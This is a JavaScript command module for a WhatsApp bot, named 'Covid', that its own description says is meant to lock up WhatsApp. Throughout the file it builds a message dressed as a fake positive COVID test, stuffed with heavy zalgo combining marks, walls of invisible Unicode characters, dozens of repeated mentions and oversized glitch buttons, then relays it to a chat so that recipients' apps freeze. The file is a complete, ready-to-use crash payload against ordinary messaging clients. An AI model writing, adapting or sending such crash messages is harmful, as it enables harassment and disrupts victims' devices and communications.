import { generateWAMessageFromContent } from "baileys";
import { PREFIX } from "../../config.js";
import { WarningError } from "../../errors/index.js";

const DEFAULT_LAT = -23.5505199;
const DEFAULT_LNG = -46.6333025;

const SPAM = "~.*@45*.🚀.*@8401*.🚀.*@5616*.~~.";

const VIRUS = "🦠☣️🧬💉😷🔬🧫🧪";
const GLITCH = "𖤐⃟𝆺𝅥⃝🩸⛧☠︎☣︎⸸𓂀𓆩𖣘𓆪༒︎▓▒░";

const WALL_LINES = 60;
const WALL_UNIT = `${"\u200E".repeat(120)}${"\u200B".repeat(12)}\u2060\uFEFF\n`;

const MENTION_COUNT = 50;

const BUTTON_INTENSITY = 90;
const BUTTON_SUB_INTENSITY = 40;
const GLITCH_REPEAT = 14;

const MARK_RANGES = [
  [0x0300, 0x036f],
  [0x0483, 0x0489],
  [0x1ab0, 0x1aff],
  [0x1dc0, 0x1dff],
  [0x20d0, 0x20ff],
  [0xfe20, 0xfe2f],
];

const randomMark = () => {
  const [min, max] = MARK_RANGES[Math.floor(Math.random() * MARK_RANGES.length)];
  return String.fromCodePoint(min + Math.floor(Math.random() * (max - min + 1)));
};

const zalgo = (text, intensity = 8) =>
  [...text]
    .map((char) => {
      if (char === " ") return char;
      let out = char;
      for (let i = 0; i < intensity; i += 1) out += randomMark();
      return out;
    })
    .join("");

const glitchBlock = (repeat = GLITCH_REPEAT) => zalgo(SPAM.repeat(repeat), 8) + GLITCH.repeat(10);

const readMoreWall = () => WALL_UNIT.repeat(WALL_LINES);

const parseCoord = (value, fallback, limit) => {
  const parsed = Number(String(value ?? "").replace(",", "."));

  if (!Number.isFinite(parsed) || Math.abs(parsed) > limit) return fallback;

  return parsed;
};

const buildMentionWall = (jid) => {
  if (!jid) return { text: "", jids: [] };

  const phone = jid.split("@")[0].split(":")[0];
  const jids = Array.from({ length: MENTION_COUNT }, () => jid);
  const text = Array.from(
    { length: MENTION_COUNT },
    () => `@${phone}${GLITCH.slice(0, 4)}`,
  ).join(" ");

  return { text, jids };
};

const EXAM_HEADER = [
  "꧁༺𖤐⃟𝆺𝅥⃝🩸𝙐𝙇𝙌𝙐𝙄𝙊𝙍𝙍𝘼-𝘽𝙊𝙏🩸⃝𝆺𝅥⃟𖤐༻꧂",
  "",
  VIRUS,
  "",
  "☣︎  𝐋 𝐀 𝐔 𝐃 𝐎   𝐃 𝐄   𝐂 𝐎 𝐕 𝐈 𝐃 - 𝟏 𝟗  ☣︎",
  "",
  "─────────── ⋆⋅☣⋅⋆ ───────────",
  "",
  "▸ CEPA ......... 𝘽𝙊𝙏-𝟏𝟗",
  "▸ VARIANTE ..... 𖤐.𝆺𝅥.🩸",
  "▸ CARGA VIRAL .. ∞",
  "▸ INCUBAÇÃO ... 136 anos",
  "▸ RESULTADO ... 𝙋𝙊𝙎𝙄𝙏𝙄𝙑𝙊",
  "",
  "─────────── ⋆⋅☣⋅⋆ ───────────",
].join("\n");

export default {
  name: "Covid",
  description: "Trava o WhatsApp com foco de contágio, parede de invisíveis e botões mutantes.",
  commands: ["covid", "travalocal", "travamap"],
  usage: `${PREFIX}covid [lat] [lng]`,

  handle: async ({ remoteJid, socket, webMessage, args, sendReply, sendSuccessReact }) => {
    const latitude = parseCoord(args?.[0], DEFAULT_LAT, 90);
    const longitude = parseCoord(args?.[1], DEFAULT_LNG, 180);

    if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
      throw new WarningError(`Use: ${PREFIX}covid -23.55 -46.63`);
    }

    await sendReply("🧬 Coletando a amostra e semeando no mapa...");

    const mentions = buildMentionWall(socket.user?.id);

    const contentText = [
      readMoreWall(),
      EXAM_HEADER,
      mentions.text,
      "",
      glitchBlock(),
      "",
      zalgo("toque no botao. depois tente voltar pro chat.", 12),
      "",
      zalgo("nao arrasta a barra. nao fecha o app. ja era.", 12),
      "",
      glitchBlock(),
      "",
      `${VIRUS}${VIRUS}${VIRUS}`,
    ].join("\n");

    const makeButton = (id, label, icon) => ({
      buttonId: `${id}${GLITCH.repeat(14)}`,
      buttonText: {
        displayText: [
          `${icon} ${zalgo(label, BUTTON_INTENSITY)}${GLITCH.repeat(10)}`,
          zalgo(`${icon}${label}${icon}`, BUTTON_SUB_INTENSITY),
        ].join("\n"),
      },
      type: 1,
    });

    const message = generateWAMessageFromContent(
      remoteJid,
      {
        buttonsMessage: {
          headerType: 6,
          locationMessage: {
            degreesLatitude: latitude,
            degreesLongitude: longitude,
            name: `${zalgo("FOCO DE CONTAGIO", 160)}${GLITCH.repeat(16)}`,
            address: [
              readMoreWall(),
              zalgo("Rua da Incubacao, 19 - Zona Vermelha", 30),
              GLITCH.repeat(20),
              zalgo(SPAM.repeat(5), 16),
              `${VIRUS}${VIRUS}`,
            ].join("\n"),
          },
          contentText,
          footerText: [
            "☣︎ AMOSTRA POSITIVA - NAO ARRASTA A BARRA ☣︎",
            GLITCH.repeat(12),
            SPAM.repeat(30),
            VIRUS,
          ].join("\n"),
          contextInfo: mentions.jids.length ? { mentionedJid: mentions.jids } : undefined,
          buttons: [
            makeButton("c1", "CONTRAIR", "🦠"),
            makeButton("c2", "ENTRAR NA UTI", "💉"),
            makeButton("c3", "TESTAR POSITIVO", "☣️"),
          ],
        },
      },
      {
        quoted: JSON.parse(JSON.stringify(webMessage)),
        userJid: socket.user?.id,
      },
    );

    await socket.relayMessage(remoteJid, message.message, { messageId: message.key.id });

    await sendSuccessReact();
  },
};